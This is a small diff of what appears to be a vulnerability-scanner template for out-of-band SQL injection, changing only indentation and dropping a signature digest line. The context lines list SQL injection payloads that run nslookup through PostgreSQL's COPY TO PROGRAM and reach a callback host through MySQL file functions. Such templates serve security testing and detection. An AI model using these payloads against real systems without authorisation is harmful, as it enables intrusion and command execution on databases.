@@ -26,11 +26,12 @@ http:
         - "copy (SELECT '') to program 'nslookup {{interactsh-url}}'--"
         - "LOAD_FILE('\\\\{{interactsh-url}}\\a')-- -"
         - "SELECT ... INTO OUTFILE '\\\\{{interactsh-url}}\a'-- -"
+
     fuzzing:
       - parts:
-         - query
-         - body
-         - header
+          - query
+          - body
+          - header
         type: postfix
         mode: single
         fuzz:
@@ -48,4 +49,3 @@ http:
         words:
           - "http"
           - "dns"
-# digest: 4a0a0047304502206b6952bbf7fd86aadaa2d0ae690a76dd930adb0f6d7800fbc927483a9fe4f5f2022100bd2a1992a3c69e599e9fb0ee8a1172fe041840585411f56915953eea6410fed3:236a7c23afe836fbe231d6e037cff444
